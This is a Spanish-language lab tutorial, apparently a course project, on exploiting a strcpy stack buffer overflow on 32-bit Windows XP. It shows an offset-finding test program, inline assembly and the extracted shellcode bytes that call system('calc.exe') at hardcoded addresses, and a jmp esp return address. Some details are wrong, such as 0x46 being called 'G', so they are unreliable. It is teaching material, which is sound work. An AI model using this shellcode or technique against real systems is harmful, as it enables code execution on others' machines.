# Objetivo

Crear un programa en C que provoque un **Desbordamiento de Buffer sencillo** en un entorno de **Windows XP 32 bits**, usando la función $\texttt{strcpy()}$ y creando un payload que use dicho programa para ejecutar el código.


## Descripción

La función $\texttt{strcpy()}$ copia una cadena de caracteres de un buffer a otro: si el tamaño de la cadena de caracteres es mayor que el tamaño del buffer de destino, se producirá un desbordamiento.

La función $\texttt{strcpy()}$ es muy utilizada en C, ya que se encuentra en la librería estándar, por lo que resulta muy importante conocer su funcionamiento  y cómo se puede explotar.



# Funcionamiento

El programa *vuln.c* es un programa que contiene un desbordamiento de buffer sencillo, que se puede explotar con el programa *tsunami.c*.

Una vez se compilan dichos programas, se generan sus versiones ejecutables, *vuln.exe* y *tsunami.exe*, respectivamente.

Basta con ejecutar el programa *tsunami.exe* dentro de un entorno de Windows XP para que, aprovechando la vulnerabilidad de *vuln.exe*, se ejecute el código malicioso: en este caso, la calculadora de Windows XP.

---

# Resolución

## Conceptos a tener en cuenta

- Funcionamiento del **Lenguaje Ensamblador**.
- [Guía de exploits](https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/1-introduccion.html).


## Pasos a seguir

### Paso 00: Establecer una carpeta compartida

> [!NOTE]
> Yo usaré una carpeta compartida generada por *Vagrant*.

El uso de una carpeta compartida, realmente, no es necesario; sin embargo, hará que el trabajo sea mucho más cómodo y rápido, ya que para la creación y manejo de los archivos vulnerables, de explotación y Shellcode, evitará las limitaciones de la Máquina Virtual pudiendo gestionarlos desde el escritorio local.


### Paso 01: Encontrar una vulnerabilidad

Más que encontrarla, se pasa directamente al caso en el que **se comprueba** una vulnerabilidad conocida: **Desbordamiento de Buffer**.

> [!NOTE]
> Aquí se explotará haciendo uso de la función $\texttt{strcpy()}$ del Lenguaje C.

La vulnerabilidad consiste, principalmente, en **otorgar a una variable un valor superior a la memoria que maneja**; o en otras palabras, asignarle a una variable que maneja $x$ bytes de memoria, un valor de más de $x$ bytes de memoria.

Un ejemplo de código que puede ofrecer una visión de esta vulnerabilidad es el siguiente:

```c
#include <string.h>  
  
int main(int argc, char **argv) {  
    char buffer[64];  
    
    strcpy(buffer, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV");
    
    return 0;  
}
```

Se usa la cadena `AAAABBBBCCCC···TTTTUUUUVVVV` para saber dónde se produce el desbordamiento, usando 4 letras repetidas para medir; es decir, si la salida del error es `46464646`, el desbordamiento se ha producido a partir de la secuencia `GGGG` (porque así es como se presenta la `G` en hexadecimal).

Tras crear el programa vulnerable y ejecutarlo, se produce el error mencionado. Los detalles muestran el dato necesario, el offset, indicando un valor `52525252`, que hace referencia a `RRRR`: es decir, el buffer se desborda al introducir `RRRR···VVVV`.


### Conclusión

Tras haber verificado esta vulnerabilidad, podemos usarla en un código vulnerable donde se use la función $\texttt{strcpy()}$ y al que se le añada un buffer, compuesto por:

1. Un contenido que se desborde (`AAAABBBB···PPPPQQQQQ`).
2. Una dirección de salto a una instrucción deseada.
3. El código de ejecución de dicha instrucción deseada.

Esta parte corresponde al primer punto pedido en el proyecto: **construir un programa vulnerable**.


## Paso 02: crear el código que ejecutará la aplicación

Ya que $\texttt{strcpy()}$ hace uso de la librería $\texttt{msvcrt.dll}$ y se quiere ejecutar la calculadora de Windows XP -identificada como *calc.exe* en el sistema-, se usará el siguiente código:

```c
#include <stdio.h>
#include <windows.h>



int main () {
    __asm{
        ; Cargar la libreria 'msvcrt.dll'
        ; LoadLibrary("msvcrt.dll")
		
        push ebp
        mov  ebp, esp
        xor  edi, edi
        push edi
		
        sub  esp, 0Ch                   ; 12, porque son 10 lineas (pero mul.4)
		
        mov byte ptr [ebp-0Bh], 6Dh     ; m
        mov byte ptr [ebp-0Ah], 73h     ; s
        mov byte ptr [ebp-09h], 76h     ; v
        mov byte ptr [ebp-08h], 63h     ; c
        mov byte ptr [ebp-07h], 72h     ; r
        mov byte ptr [ebp-06h], 74h     ; t
        mov byte ptr [ebp-05h], 2Eh     ; .
        mov byte ptr [ebp-04h], 64h     ; d
        mov byte ptr [ebp-03h], 6Ch     ; l
        mov byte ptr [ebp-02h], 6Ch     ; l
		
        lea eax, [ebp-0Bh]              ; Ultima posicion de 'msvcrt.dll'
		
        push eax
        mov ebx,0x7c801d7b              ; Direccion de la libreria 'LoadLibrary'
        call ebx
		
		
        ; Cargar la Calculadora ('calc.exe')
        ; system(calc.exe)
		
        push ebp
        mov  ebp, esp
        xor  edi, edi
        push edi
		
        sub  esp, 08h                   ; 08, porque son 8 lineas (y ya es mul.4)
		
        mov byte ptr [ebp-09h], 63h     ; c
        mov byte ptr [ebp-08h], 61h     ; a
        mov byte ptr [ebp-07h], 6Ch     ; l
        mov byte ptr [ebp-06h], 63h     ; c
        mov byte ptr [ebp-05h], 2Eh     ; .
        mov byte ptr [ebp-04h], 65h     ; e
        mov byte ptr [ebp-03h], 78h     ; x
        mov byte ptr [ebp-02h], 65h     ; e
		
        lea eax, [ebp-09h]              ; Ultima posicion de 'calc.exe'
		
        push eax
        mov  ebx, 0x77c293c7            ; Direccion de la libreria 'system'
        call ebx
    }
}
```

> [!WARNING]
> **Las cabeceras de $\texttt{windows.h}$ fallan fuera de Windows XP.**  
> Se necesita compilar y contruir el código del ejecutable dentro de Windows XP.  
> Por ejemplo, usando *Visual Studio C++ 6.0*.

Tras construir el ejecutable, se comprueba que este ejecuta la calculadora correctamente.


### Conclusión

> [!NOTE]
> Esta parte corresponde al tercer punto: **crear un programa que ejecute la calculadora**.


## Paso 03: extraer el código hexadecimal del ensamblador

Dado el código anterior, se requiere sola y exclusivamente el código ensamblador (el contenido de `__asm{...}`) para el Shellcode, por lo que usando _Visual Studio C++ 6.0_ desde Windows XP y usando el comando `xxd -i codigo.c > codigo.hex` (siendo el código anterior el argumento), se obtiene:

```c
unsigned char asm_obj[] = {
    0x4c, 0x01, 0x05, 0x00, 0xfe, 0x59, 0xf1, 0x62, 0x5a, 0x24, 0x00, 0x00,
    0x1c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e, 0x64, 0x72, 0x65,
    0x63, 0x74, 0x76, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x62, 0x00, 0x00, 0x00, 0xdc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x10, 0x00,
    0x2e, 0x64, 0x65, 0x62, 0x75, 0x67, 0x24, 0x53, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xeb, 0x20, 0x00, 0x00, 0x3e, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x00, 0x10, 0x42, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x99, 0x00, 0x00, 0x00,

    // (...)
    // Se ha omitido parte del código para no ocupar demasiado espacio.
    // (...)

    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e, 0x64, 0x65, 0x62, 0x75, 0x67,
    0x24, 0x53, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x03, 0x02,
    0x4e, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x03, 0x00, 0x05, 0x00, 0x00, 0x00, 0x73, 0xbf, 0xd2, 0x13, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x2e, 0x64, 0x65, 0x62, 0x75, 0x67, 0x24, 0x54, 0x00, 0x00, 0x00, 0x00,
    0x05, 0x00, 0x00, 0x00, 0x03, 0x02, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00
};

unsigned int asm_obj_len = 9814;
```

> [!NOTE]
> El texto original de $\texttt{codigo.hex}$ mide poco más de 800 líneas; se ha quitado parte del relleno para la representación.

Este código es una traducción literal de todo el contenido del código mostrado en el [Paso 02](#paso-02-crear-el-cdigo-que-ejecutar-la-aplicacin), pero solo es necesario el contenido de `__asm{}`. Por tanto, se debe:

1. Averiguar cuándo empieza el código de ensamblador.
2. Extraer todo ese código y transformarlo a Byte.


### Extraer el código ensamblador

Se sabe que $\texttt{push ebp}$ (la primera línea del código ensamblador) se traduce como $\texttt{0x55, 0x8b}$, por lo que se busca dicho patrón de cadena y se extrae visualizando el contenido del fichero anterior.

Esas direcciones se pueden obtener a través del comando $\texttt{objdump}$ de Linux, a través de la carpeta compartida de Vagrant de la Máquina Virtual. Usando dicho comando se puede observar dichas direcciones y una vez encontradas, filtrarlas en el fichero hexadecimal obtenido en la sección anterior.

Una vez filtrado el contenido, se obtiene un resultado parecido al siguiente:

```text
                                                      0x55, 0x8b, 0xec,
0x33, 0xff, 0x57, 0x83, 0xec, 0x0c, 0xc6, 0x45, 0xf5, 0x6d, 0xc6, 0x45,
0xf6, 0x73, 0xc6, 0x45, 0xf7, 0x76, 0xc6, 0x45, 0xf8, 0x63, 0xc6, 0x45,
0xf9, 0x72, 0xc6, 0x45, 0xfa, 0x74, 0xc6, 0x45, 0xfb, 0x2e, 0xc6, 0x45,
0xfc, 0x64, 0xc6, 0x45, 0xfd, 0x6c, 0xc6, 0x45, 0xfe, 0x6c, 0x8d, 0x45,
0xf5, 0x50, 0xbb, 0x7b, 0x1d, 0x80, 0x7c, 0xff, 0xd3,
                                                      0x55, 0x8b, 0xec,
0x33, 0xff, 0x57, 0x83, 0xec, 0x08, 0xc6, 0x45, 0xf7, 0x63, 0xc6, 0x45,
0xf8, 0x61, 0xc6, 0x45, 0xf9, 0x6c, 0xc6, 0x45, 0xfa, 0x63, 0xc6, 0x45,
0xfb, 0x2e, 0xc6, 0x45, 0xfc, 0x65, 0xc6, 0x45, 0xfd, 0x78, 0xc6, 0x45,
0xfe, 0x65, 0x8d, 0x45, 0xf7, 0x50, 0xbb, 0xc7, 0x93, 0xc2, 0x77, 0xff,
0xd3
```

Este es el código de la Shellcode, pero previamente debe transformarse a Byte.


#### Transformar el código a Byte

1. Se cambian los `0x` por `\x`.
2. Se eliminan los `espacios` y `\n`.

```text
                                    \x55\x8b\xec
\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45
\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45
\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45
\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45
\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3
                                    \x55\x8b\xec
\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45
\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45
\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45
\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff
\xd3
```


## Paso 04: dirección de salto $\texttt{jmp esp}$

Usando el programa $\texttt{findjump.exe}$, puede obtenerse la dirección de salto necesaria para el offset: $\texttt{0x7c86467b}$.

```cmd
findjump.exe kernel32.dll ESP
```


## Paso 05: combinar los puntos anteriores

Una vez obtenido cómo se desborda el buffer, la dirección de salto y el código de la Shellcode, se puede crear el código final que se ejecutará en la máquina virtual, dando como resultado al fichero *tsunami.c*.

> [!NOTE]
> Observa cómo se han colocado los datos obtenidos en el código.
